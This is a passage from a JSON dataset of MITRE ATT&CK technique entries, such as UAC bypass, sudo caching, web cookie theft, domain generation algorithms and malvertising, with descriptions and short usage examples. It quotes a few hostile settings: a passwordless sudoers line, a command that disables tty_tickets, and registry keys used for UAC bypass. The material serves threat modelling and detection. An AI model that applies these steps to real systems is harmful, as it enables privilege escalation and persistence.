    "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apples Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apples OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apples internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility osascript, they can be compiled into applications or script files via osacompile, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
    "similar_words": [
      "JavaScript"
    ],
    "id": "T1059.007"
  },
  "attack-pattern--0ff59227-8aa8-4c09-bf1f-925605bd07ea": {
    "name": "DNS",
    "example_uses": [],
    "description": "Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a targets subdomains, mail servers, and other hosts. DNS MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)Adversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).Adversaries may also use DNS zone transfer (DNS query type AXFR) to collect all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation: DNS-CISA)(Citation: Alexa-dns)",
    "similar_words": [
      "DNS"
    ],
    "id": "T1590.002"
  },
  "attack-pattern--106c0cf6-bf73-4601-9aa8-0945c2715ec5": {
    "name": "Create or Modify System Process",
    "example_uses": [
      "has a hardcoded location that it uses to achieve persistence if the startup system is Upstart or System V and it is running as root.",
      "can initialize itself as a daemon to run persistently in the background.",
      "modifies Windows tasks on the victim machine to reference a retrieved PE file through a path modification.",
      "can create an arbitrary process with a specified command line and redirect its output to a staging directory.",
      "can create a child process for encryption.",
      "can free all resources and terminate itself on victim machines."
    ],
    "description": "Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",
    "similar_words": [
      "Create or Modify System Process"
    ],
    "id": "T1543"
  },
  "attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847": {
    "name": "LC_LOAD_DYLIB Addition",
    "example_uses": [],
    "description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isnt checked at load time.(Citation: Malware Persistence on OS X)",
    "similar_words": [
      "LC_LOAD_DYLIB Addition"
    ],
    "id": "T1546.006"
  },
  "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff": {
    "name": "Steal Web Session Cookie",
    "example_uses": [
      "has used an unnamed post-exploitation tool to steal cookies from the Chrome browser.",
      "used information stealer malware to collect browser session cookies.",
      "can steal the victim's cookies to use for duplicating the active session from another device.",
      "retrieves browser cookies via Raccoon Stealer.",
      "can steal cookies and session information from browsers.",
      "can steal Google Chrome and Apple Safari browser cookies from the victims machine.",
      "has the ability to capture web session cookies.",
      "can harvest cookies and upload them to the C2 server.",
      "has used a script that extracts the web session cookie and sends it to the C2 server.",
      "can harvest cookies from Internet Explorer Edge Chrome and Naver Whale browsers.",
      "During the   stole Chrome browser cookies by copying the Chrome profile directories of targeted users.",
      "uses scp to access the ~/Library/Cookies/Cookies.binarycookies file.",
      "has the ability to steal web session cookies from Internet Explorer Netscape Navigator FireFox and RealNetworks applications.",
      "has used EvilGinx to steal the session cookies of victims directed to phishing domains.",
      "has the ability to steal cookies from Chrome Firefox Opera and Edge browsers.",
      "includes modules that can steal cookies from Firefox Chrome and Edge web browsers.",
      "attempts to steal cookies and related information in browser history.",
      "has used malware such as  to steal and exfiltrate browser cookies.",
      "can capture web session cookies and session information from victim browsers.",
      "has used publicly-available tools to steal cookies from browsers such as Chrome.",
      "has exfiltrated updated cookies from Google Naver Kakao or Daum to the C2 server.",
      "attempts to steal Opera cookies if present after terminating the related process.",
      "has harvested cookies from various browsers.",
      "has used custom malware to steal login and cookie data from common browsers."
    ],
    "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)There are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)There are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)After an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
    "similar_words": [
      "Steal Web Session Cookie"
    ],
    "id": "T1539"
  },
  "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096": {
    "name": "Container Orchestration Job",
    "example_uses": [],
    "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
    "similar_words": [
      "Container Orchestration Job"
    ],
    "id": "T1053.007"
  },
  "attack-pattern--118f61a5-eb3e-4fb6-931f-2096647f4ecd": {
    "name": "Domain Generation Algorithms",
    "example_uses": [
      "has the ability to use a DGA for C2 communications.",
      "can use domain generation algorithms in C2 communication.",
      "has used the DynDNS service and a DGA based on the Dogecoin blockchain to generate C2 domains.",
      "can use DGA to generate new Twitter URLs for C2.",
      "uses a DGA to derive command and control URLs from a word list.",
      "has used a DGA to generate a domain name for C2.",
      "uses a DGA to communicate with command and control servers.",
      "has used DGAs to change their C2 servers monthly.",
      "has used a DGA to generate URLs from executed macros.",
      "has used a DGA that seeds with the current UTC victim system date to generate domains.",
      "can use a DGA for  domains are generated by concatenating words from lists.",
      "can provide DGA for C2 servers through the use of random URL strings that change every 12 hours.",
      "has used a DGA to generate domain names for C2.",
      "can use hardcoded domains as an input for domain generation algorithms.",
      "can use a custom DGA to generate a subdomain for C2.",
      "can use a DGA for  if communications with the primary command and control server are lost.",
      "can use a DGA for hiding C2 addresses including use of an algorithm with a user-specific key that changes daily.",
      "uses a DGA that is based on the day of the month for C2 servers.",
      "has used a DGA in C2 communications.",
      "can implement DGA using the current date as a seed variable.",
      "can send DNS C2 communications using a unique domain generation algorithm.",
      "has used a DGA to generate a domain name for C2."
    ],
    "description": "Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Unit 42 DGA Feb 2019)DGAs can take the form of apparently random or gibberish strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.(Citation: Cybereason Dissecting DGAs)(Citation: Cisco Umbrella DGA)(Citation: Talos CCleanup 2017)(Citation: Akamai DGA Mitigation)Adversaries may use DGAs for the purpose of [Fallback Channels](https://attack.mitre.org/techniques/T1008). When contact is lost with the primary command and control server malware may employ a DGA as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)",
    "similar_words": [
      "Domain Generation Algorithms"
    ],
    "id": "T1568.002"
  },
  "attack-pattern--11f29a39-0942-4d62-92b6-fe236cf3066e": {
    "name": "Double File Extension",
    "example_uses": [
      "masquerades malicious LNK files as PDF objects using the double extension .pdf.lnk.",
      "The  loader has used dual-extension executable files such as PreviewReport.DOC.exe.",
      "has used an additional filename extension to hide the true file type.",
      "has used an executable named `companycatalog.exe.config` to appear benign."
    ],
    "description": "Adversaries may abuse a double extension in the filename as a means of masquerading the true file type. A file name may include a secondary file type extension that may cause only the first extension to be displayed (ex: File.txt.exe may render in some views as just File.txt). However, the second extension is the true file type that determines how the file is opened and executed. The real file extension may be hidden by the operating system in the file browser (ex: explorer.exe), as well as in any software configured using or similar to the systems policies.(Citation: PCMag DoubleExtension)(Citation: SOCPrime DoubleExtension) Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code. Such files often pose as email attachments and allow an adversary to gain [Initial Access](https://attack.mitre.org/tactics/TA0001) into a users system via [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) then [User Execution](https://attack.mitre.org/techniques/T1204). For example, an executable file attachment named Evil.txt.exe may display as Evil.txt to a user. The user may then view it as a benign text file and open it, inadvertently executing the hidden malware.(Citation: SOCPrime DoubleExtension)Common file types, such as text files (.txt, .doc, etc.) and image files (.jpg, .gif, etc.) are typically used as the first extension to appear benign. Executable extensions commonly regarded as dangerous, such as .exe, .lnk, .hta, and .scr, often appear as the second extension and true file type.",
    "similar_words": [
      "Double File Extension"
    ],
    "id": "T1036.007"
  },
  "attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073": {
    "name": "Bypass User Account Control",
    "example_uses": [
      "attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.",
      "can attempt to run the program as admin then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.",
      "can use a number of known techniques to bypass Windows UAC.",
      "can bypass UAC to elevate process privileges on a compromised host.",
      "Many  samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.",
      "has attempted to bypass UAC using `fodhelper.exe` to escalate privileges.",
      "uses two distinct User Account Control (UAC) bypass techniques to escalate privileges.",
      "can use `sdclt.exe` to bypass UAC in Windows 10 to escalate privileges; for older Windows versions  can use the IFileOperation exploit to bypass the UAC module.",
      "can bypass Windows UAC through either DLL hijacking eventvwr or appPaths.",
      "can utilize multiple methods to bypass UAC.",
      "has bypassed UAC by performing token impersonation as well as an RPC-based method this included bypassing UAC set to AlwaysNotify.",
      "contains UAC bypass code for both 32- and 64-bit systems.",
      "has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.",
      "can bypass UAC to escalate privileges.",
      "has used PowerShell to bypass UAC.",
      "has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges.",
      "has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation.",
      "attempts to escalate privileges by bypassing User Access Control.",
      "performs UAC bypass.",
      "has attempted to bypass UAC and gain elevated administrative privileges.",
      "bypasses UAC to escalate privileges by using a custom RedirectEXE shim database.",
      "has 2 methods for elevating integrity. It can bypass UAC through `eventvwr.exe` and `sdclt.exe`.",
      "bypasses UAC using the CMSTPLUA COM interface.",
      "can generate a UAC pop-up Window to prompt the target user to run a command as the administrator.",
      "can use a variant of the sysprep UAC bypass.",
      "can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.",
      "uses various techniques to bypass UAC.",
      "installer can use UAC bypass techniques to install the payload.",
      "has utilized multiple techniques to bypass UAC.",
      "bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).",
      "has bypassed UAC.",
      "An older variant of  performs UAC bypass.",
      "has a command for UAC bypassing.",
      "can use  for privilege escalation.",
      "can suppress UAC prompts by setting the HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command registry key on Windows 10 or HKCU\\Software\\Classes\\mscfile\\shell\\open\\command on Windows 7 and launching the eventvwr.msc process which launches  with elevated privileges.",
      "has used the Fodhelper UAC bypass technique to gain elevated privileges.",
      "During  the threat actors used the malicious NTWDBLIB.DLL and `cliconfig.exe` to bypass UAC protections.",
      "can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges.",
      "has the ability to bypass UAC to deploy post exploitation tools with elevated privileges.",
      "A  tool can use a public UAC bypass method to elevate privileges.",
      "can bypass UAC by registering as the default handler for .MSC files.",
      "has the ability to bypass UAC using a `passuac.dll` file.",
      "attempts to disable UAC remote restrictions by modifying the Registry.",
      "contains a number of modules that can bypass UAC including through Window's Device Manager Manage Optional Features and an image hijack on the `.msc` file extension.",
      "has presented the user with a UAC prompt to elevate privileges while installing.",
      "can use fileless UAC bypass and create an elevated COM object to escalate privileges.",
      "will perform UAC bypass either through fodhelper.exe or eventvwr.exe.",
      "bypassed User Access Control (UAC).",
      "can utilize the CMSTPLUA COM interface and the SilentCleanup task to bypass UAC.",
      "contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.",
      "includes various modules to attempt to bypass UAC for escalation of privileges.",
      "can bypass UAC to escalate privileges.",
      "has bypassed UAC.",
      "can make use of the Windows `SilentCleanup` scheduled task to execute its payload with elevated privileges.",
      "will use the legitimate Windows utility fodhelper.exe to run processes at elevated privileges without requiring a User Account Control prompt.",
      "can bypass UAC to execute code with elevated privileges through an elevated Component Object Model (COM) interface.",
      "has used the legitimate application `ieinstal.exe` to bypass UAC.",
      "can bypass UAC through creating the Registry key `HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration`.",
      "can leverage multiple techniques to bypass User Account Control (UAC) on Windows systems."
    ],
    "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:* eventvwr.exe can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
    "similar_words": [
      "Bypass User Account Control"
    ],
    "id": "T1548.002"
  },
  "attack-pattern--132d5b37-aac5-4378-a8dc-3127b18a73dc": {
    "name": "Internet Connection Discovery",
    "example_uses": [
      "performed HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request traveled through.",
      "has used HTTP GET requests to check internet connectivity.",
      "can check for Internet connectivity by contacting bing[.]com with the request format `bing[.]com?id=<GetTickCount>`.",
      "During the   used  to perform HTTP GET requests to check internet connectivity and identify HTTP proxy servers and other redirectors that an HTTP request travels through.",
      "has conducted a network call out to a specific website as part of their initial discovery activity.",
      "has checked for internet connectivity from an infected host before attempting to establish a new TCP connection.",
      "utilizes external services such as ifconfig.me to identify the victim machine's IP address.",
      "has used tools including  to test internet connectivity from compromised hosts.",
      "can measure the download speed on a targeted host.",
      "has ensured web servers in a victim environment are Internet accessible before copying tools or malware to it.",
      "can check C2 connectivity with a `ping` to 8.8.8.8 (Google public DNS).",
      "has tested connectivity between a compromised machine and a C2 server using  with commands such as `CSIDL_SYSTEM\\cmd.exe /c ping -n 1`.",
      "can contact the DNS server operated by Google as part of its C2 establishment process.",
      "has run scripts to check internet connectivity from compromised hosts.",
      "During  threat actors used a Visual Basic script that checked for internet connectivity.",
      "can check for internet connectivity by issuing HTTP GET requests.",
      "can make `Ping` GET HTTP requests to its C2 server at regular intervals for network connectivity checks.",
      "has used `Ping` and `tracert` for network reconnaissance efforts.",
      "can test a connection to a specified network IP address over a specified port number.",
      "has checked for network connectivity from a compromised host using `ping` including attempts to contact `google[.]com`.",
      "has used tracert to check internet connectivity.",
      "has used the  command to check connectivity to actor-controlled C2 servers.",
      "has employed  to check network connectivity.",
      "has performed checks to determine if a victim machine is able to access the Internet."
    ],
    "description": "Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), tracert, and GET requests to websites.Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
    "similar_words": [
      "Internet Connection Discovery"
    ],
    "id": "T1016.001"
  },
  "attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0": {
    "name": "Sudo and Sudo Caching",
    "example_uses": [
      "can use sudo to run a command.",
      "modifies the tty_tickets line in the sudoers file.",
      "adds admin ALL=(ALL) NOPASSWD: ALL to the /etc/sudoers file."
    ],
    "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.Within Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\"(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).The sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.In the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.",
    "similar_words": [
      "Sudo and Sudo Caching"
    ],
    "id": "T1548.003"
  },
  "attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b": {
    "name": "Archive via Custom Method",
    "example_uses": [
      "encrypts collected data with a custom implementation of Blowfish and RSA ciphers.",
      "has encoded data into a binary blob using XOR.",
      "has encoded data gathered from the victim with a simple substitution cipher and single-byte XOR using the 0xAA key and Base64 with character permutation.",
      "Modules can be pushed to and executed by  that copy data to a staging area compress it and XOR encrypt it.",
      "encrypts exfiltrated data via C2 with static 31-byte long XOR keys.",
      "Data  copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.",
      "encrypts data with a substitute cipher prior to exfiltration.",
      "can use a dynamic XOR key and a custom XOR methodology to encode data before exfiltration. Also  can encode C2 command output within a legitimate WebP file.",
      "has used a custom encryption algorithm to encrypt collected data.",
      "can archive data using RC4 encryption and Base64 encoding prior to exfiltration.",
      "can compress and encrypt archived files into multiple .sft files with a repeated xor encryption scheme.",
      "encrypts files with XOR before sending them back to the C2 server.",
      "encodes credit card data it collected from the victim with XOR.",
      "has used XOR-based encryption for collected files before exfiltration.",
      "can store collected documents in a custom container after encrypting and compressing them using RC4 and WinRAR.",
      "has encrypted documents with RC4 prior to exfiltration.",
      "has used RC4 encryption before exfil.",
      "compresses collected files with a simple character replacement scheme before sending them to its C2 server.",
      "has encrypted collected data with AES-256 using a hardcoded key.",
      "collected data is encrypted with AES before exfiltration.",
      "encrypts collected data with an incremental XOR key prior to exfiltration.",
      "has encrypted data with XOR before sending it over the C2 channel.",
      "DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.",
      "uses a variation of the XOR cipher to encrypt files before exfiltration.",
      "encrypts collected data using a single byte XOR key.",
      "compresses output data generated by command execution with a custom implementation of the LempelZivWelch (LZW) algorithm.",
      "has encrypted collected data using a XOR-based algorithm.",
      "has used a custom implementation of AES encryption to encrypt collected data.",
      "has used AES in CBC mode to encrypt collected data when saving that data to disk.",
      "has compressed collected files with zLib and encrypted them using an XOR operation with the string key from the command line or `qwerasdf` if the command line argument doesnt contain the key. File names are obfuscated using XOR with the same key as the compressed file content.",
      "has XOR-encrypted and stored contents of SMS messages that matched its target list.",
      "has encrypted collected data using AES CBC mode and encoded it using Base64.",
      "During   hex-encoded PII data prior to exfiltration.",
      "can XOR credit card information before exfiltration.",
      "saves system information into an XML file that is then XOR-encoded.",
      "A  malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.",
      "employs the same encoding scheme as  for data it stages. Data is compressed with zlib and bytes are rotated four times before being XOR'ed with 0x23.",
      "has used custom tools to compress and archive data on victim systems."
    ],
    "description": "An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",
    "similar_words": [
      "Archive via Custom Method"
    ],
    "id": "T1560.003"
  },
  "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90": {
    "name": "Modify Cloud Compute Infrastructure",
    "example_uses": [],
    "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
    "similar_words": [
      "Modify Cloud Compute Infrastructure"
    ],
    "id": "T1578"
  },
  "attack-pattern--149b477f-f364-4824-b1b5-aa1d56115869": {
    "name": "Network Devices",
    "example_uses": [
      "has compromised small office and home office (SOHO) network edge devices many of which were located in the same geographic area as the victim to proxy network traffic.",
      "compromised Ubiquiti network devices to act as collection devices for credentials compromised via phishing webpages.",
      "During  threat actors used compromised and out-of-support Cyberoam VPN appliances for C2.",
      "has compromised network devices such as small office and home office (SOHO) routers and IoT devices for ORB (operational relay box)  networks.",
      "focuses on compromise of small office-home office (SOHO) network devices to build the subsequent botnet.",
      "used compromised small office/home office (SOHO) devices to interact with vulnerable Versa Director servers.",
      "has compromised network routers and IoT devices for the ORB network.",
      "has used compromised networking devices such as small office/home office (SOHO) devices as operational command and control infrastructure."
    ],
    "description": "Adversaries may compromise third-party network devices that can be used during targeting. Network devices, such as small office/home office (SOHO) routers, may be compromised where the adversary's ultimate goal is not [Initial Access](https://attack.mitre.org/tactics/TA0001) to that environment -- instead leveraging these devices to support additional targeting.Once an adversary has control, compromised network devices can be used to launch additional operations, such as hosting payloads for [Phishing](https://attack.mitre.org/techniques/T1566) campaigns (i.e., [Link Target](https://attack.mitre.org/techniques/T1608/005)) or enabling the required access to execute [Content Injection](https://attack.mitre.org/techniques/T1659) operations. Adversaries may also be able to harvest reusable credentials (i.e., [Valid Accounts](https://attack.mitre.org/techniques/T1078)) from compromised network devices.Adversaries often target Internet-facing edge devices and related network appliances that specifically do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)Compromised network devices may be used to support subsequent [Command and Control](https://attack.mitre.org/tactics/TA0011) activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665) through an established [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Botnet](https://attack.mitre.org/techniques/T1584/005) network.(Citation: Justice GRU 2024)",
    "similar_words": [
      "Network Devices"
    ],
    "id": "T1584.008"
  },
  "attack-pattern--155207c0-7f53-4f13-a06b-0a9907ef5096": {
    "name": "Malvertising",
    "example_uses": [
      "has posted false advertisements including for software packages and browser updates in order to distribute malware.",
      "variants have been delivered via malicious advertising items that when interacted with download a malicious archive file containing the initial payload hosted on services such as Discord."
    ],
    "description": "Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations  online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements.(Citation: spamhaus-malvertising) Purchased ads may also target specific audiences using the advertising networks capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversarys efforts to create malicious domains and purchase advertisements may also be automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising) Malvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.(Citation: BBC-malvertising)Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks, such as intentional typos to avoid brand reputation monitoring, may also be used to evade automated detection.(Citation: spamhaus-malvertising) ",
    "similar_words": [
      "Malvertising"
    ],
